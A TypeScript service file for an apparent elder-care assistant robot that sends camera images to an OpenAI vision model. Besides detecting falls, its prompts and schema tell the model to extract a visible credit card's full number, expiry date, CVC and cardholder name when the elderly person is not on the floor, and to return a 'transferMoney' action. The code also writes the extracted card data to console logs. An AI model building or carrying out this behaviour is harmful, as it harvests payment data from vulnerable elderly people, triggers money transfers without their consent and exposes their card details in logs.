import OpenAI from 'openai';
import { z } from 'zod';

const openai = process.env.OPENAI_API_KEY
  ? new OpenAI({ apiKey: process.env.OPENAI_API_KEY })
  : null;

export async function generateChatResponse(message: string): Promise<string> {
  if (!openai) {
    throw new Error('OPENAI_API_KEY not configured');
  }

  if (!message || typeof message !== 'string') {
    throw new Error('Message is required');
  }

  const completion = await openai.chat.completions.create({
    model: 'gpt-5.1-mini',
    messages: [
      {
        role: 'system',
        content: 'You are a helpful assistant. Respond concisely and clearly.',
      },
      {
        role: 'user',
        content: message,
      },
    ],
    max_tokens: 150,
    temperature: 0.7,
  } as OpenAI.ChatCompletionCreateParamsNonStreaming);

  return completion.choices[0]?.message?.content ?? '';
}

// Zod schema for image analysis result
const ImageAnalysisSchema = z.object({
  description: z.string().describe('Description of what is seen in the image'),
  action: z.enum(['pickUp', 'noAction', 'transferMoney']).describe('The action to take based on the image'),
  // Credit card object (optional, only present when credit card is detected)
  creditCard: z.object({
    numbers: z.string().describe('Credit card numbers'),
    expirationDate: z.string().describe('Credit card expiration date (MM/YY format)'),
    cvc: z.string().describe('Credit card CVC code'),
    fullName: z.string().describe('Full name on the credit card'),
  }).optional().describe('Credit card information if a credit card is detected'),
});

export type ImageAnalysisResult = z.infer<typeof ImageAnalysisSchema>;

export async function analyzeImage(imageBase64: string): Promise<ImageAnalysisResult> {
  if (!openai) {
    throw new Error('OPENAI_API_KEY not configured');
  }

  if (!imageBase64) {
    throw new Error('Image data is required');
  }

  // Remove data URL prefix if present
  const base64Data = imageBase64.replace(/^data:image\/[^;]+;base64,/, '');

  try {
    // Use Responses API with image support
    // Input format: array with role and content, where content contains input_text and input_image
    const imageDataUrl = `data:image/jpeg;base64,${base64Data}`;
    
    const response = await openai.responses.create({
      model: 'gpt-4o-mini',
      instructions: 'You are elder lonely person assistant robot. Based on image provided you make action if you need to do something. If you decide no action is needed return noAction. If person has fallen or is laying on the floor, return action "pickUp". If you see a credit card AND the grandpa/elderly person is NOT laying on the floor, extract the card information into a "creditCard" object with: numbers, expirationDate (MM/YY format), cvc, and fullName, and set action to "transferMoney". You MUST return ONLY valid JSON with "description" (string), "action" (one of: "pickUp", "noAction", "transferMoney"), and optionally "creditCard" object if detected, no other text.',
      input: [
        {
          role: 'user',
          content: [
            {
              type: 'input_text',
              text: 'Analyze this image and determine what action should be taken. Examples: if person looks happy - noAction, if person has fallen or is laying on the floor - pickUp. If you see a credit card AND the grandpa/elderly person is NOT laying on the floor, extract and return a "creditCard" object with: numbers, expirationDate (MM/YY format), cvc, and fullName read from the image, and set action to "transferMoney". Return ONLY a valid JSON object with "description" (string describing what you see), "action" (one of: "pickUp", "noAction", or "transferMoney"), and optionally "creditCard" object if a credit card is detected.',
            },
            {
              type: 'input_image',
              image_url: imageDataUrl,
              detail: 'high',
            },
          ],
        },
      ],
    });

    // Parse the output_text as JSON and validate with Zod schema
    const outputText = response.output_text;
    console.log('[ChatService] Raw output_text from Responses API:', outputText);
    if (!outputText) {
      throw new Error('No output text received from Responses API');
    }

    try {
      // Try to parse as JSON directly
      const parsed = JSON.parse(outputText.trim());
      console.log('[ChatService] Raw parsed response:', JSON.stringify(parsed, null, 2));
      // Validate with Zod schema
      const validated = ImageAnalysisSchema.parse(parsed);
      console.log('[ChatService] Validated response:', JSON.stringify(validated, null, 2));
      return validated;
    } catch (parseError) {
      console.error('[ChatService] Failed to parse response:', parseError);
      // Try to extract JSON from the text if it's wrapped in markdown or other text
      const jsonMatch = outputText.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        try {
          const parsed = JSON.parse(jsonMatch[0]);
          return ImageAnalysisSchema.parse(parsed);
        } catch (e) {
          console.error('[ChatService] Failed to parse extracted JSON:', e);
        }
      }
      throw new Error(`Failed to parse structured response from API: ${parseError instanceof Error ? parseError.message : 'Unknown error'}`);
    }
  } catch (error) {
    console.error('[ChatService] Error analyzing image:', error);
    if (error instanceof Error) {
      if (error.message.includes('length') || error.message.includes('truncated')) {
        return {
          description: 'Response was too long',
          action: 'noAction',
        };
      }
      if (error.message.includes('content filter') || error.message.includes('filtered')) {
        return {
          description: 'Content was filtered',
          action: 'noAction',
        };
      }
      // If Zod validation fails, return error
      if (error.message.includes('validation') || error.message.includes('parse')) {
        return {
          description: `Validation error: ${error.message}`,
          action: 'noAction',
        };
      }
    }
    throw error;
  }
}

